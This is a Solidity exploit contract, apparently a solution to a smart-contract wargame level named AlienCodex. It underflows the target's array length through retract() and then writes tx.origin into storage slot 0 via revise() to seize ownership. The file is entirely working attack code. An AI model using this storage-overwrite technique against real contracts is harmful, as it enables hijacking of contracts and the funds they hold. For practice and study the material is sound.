// SPDX-License-Identifier: MIT
pragma solidity ^0.6.5;

interface AlienCodex {
    function make_contact() external;
    function retract()  external;
    function revise(uint i, bytes32 _content)  external;
}


contract AlienHack {
    

    function exploit (address _instanceAddr) external {
        AlienCodex instance = AlienCodex(_instanceAddr);
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        instance.make_contact();
        instance.retract();
        instance.revise(index, myAddress);
    }
}
